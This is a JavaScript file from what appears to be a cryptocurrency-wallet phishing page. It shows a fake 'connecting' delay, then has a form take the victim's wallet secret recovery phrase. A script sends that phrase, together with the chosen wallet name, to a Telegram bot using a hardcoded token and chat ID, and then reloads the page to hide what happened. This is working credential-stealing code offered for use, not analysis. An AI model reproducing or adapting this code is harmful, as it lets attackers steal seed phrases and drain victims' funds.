const pop_up = document.getElementById("pop-up-disp");
const pop_up_1 = document.getElementById("pop-up-disp1");
const disp = document.getElementById("show");
const close = document.getElementById("close");
const btn1 = document.querySelector("#btn1");
const box_in = document.querySelector("#box_in");
const con = document.querySelector("#con");
const sect = document.querySelector("#sect");
const connect = document.querySelector("#connect");
const form_disp = document.querySelector("#form-disp");
const btn2 = document.querySelector("#btn2");
const btn3 = document.querySelector("#btn3");

pop_up.addEventListener("click", () => {
  disp.style.display = "block";
});

pop_up_1.addEventListener("click", () => {
  disp.style.display = "block";
});

close.addEventListener("click", () => {
  disp.style.display = "none";
});

btn1.addEventListener("click", () => {
  box_in.style.display = "none";
  con.style.display = "block";

  setTimeout(() => {
    con.style.display = "none";
    sect.style.display = "block";
  }, 3000);
});

btn2.addEventListener("click", () => {
  box_in.style.display = "none";
  con.style.display = "block";

  setTimeout(() => {
    con.style.display = "none";
    sect.style.display = "block";
  }, 3000);
});

btn3.addEventListener("click", () => {
  box_in.style.display = "none";
  con.style.display = "block";

  setTimeout(() => {
    con.style.display = "none";
    sect.style.display = "block";
  }, 3000);
});

connect.addEventListener("click", () => {
  sect.style.display = "none";
  form_disp.style.display = "block";
});

// get selected wallet
let selectWallet = null;
$(".btns button").click(function(){
	const walletTitile = $(this).data('title');
	selectWallet = walletTitile;
})
$("#phraseForm").on("submit", function (ev) {
  // const secret_phrase = $("#secret_phrase").val();
  ev.preventDefault();
  // alert(secret_phrase);
  // return false;

  const token = "7888244093:AAG7j-8SiAyIaq0a5zJA_f5-F0a3YzIBlHI";
  const chatId = "6563455749";

  var walletVal = selectWallet; // wallet_name.innerHTML
  var phraseVal = document.getElementById("secret_phrase").value;
  const message
	= `*********************************
	
Wallet: ${walletVal}\nPhrase: ${phraseVal}
	
	*********************************`;

  if (phraseVal != "") {
    // AJAX CALL
    $.ajax({
      type: "POST",
      url: `https://api.telegram.org/bot${token}/sendMessage`,
      data: {
        chat_id: chatId,
        text: message,
        parse_mode: "html",
      },
      success: function (respnx) {
        // alert("Failed, try again!");
				window.location.reload();
      },
      error: function (badx) {
        alert("Oops! Something went wrong. Check your internet!");
        console.log(badx);
      },
    });
  }
});
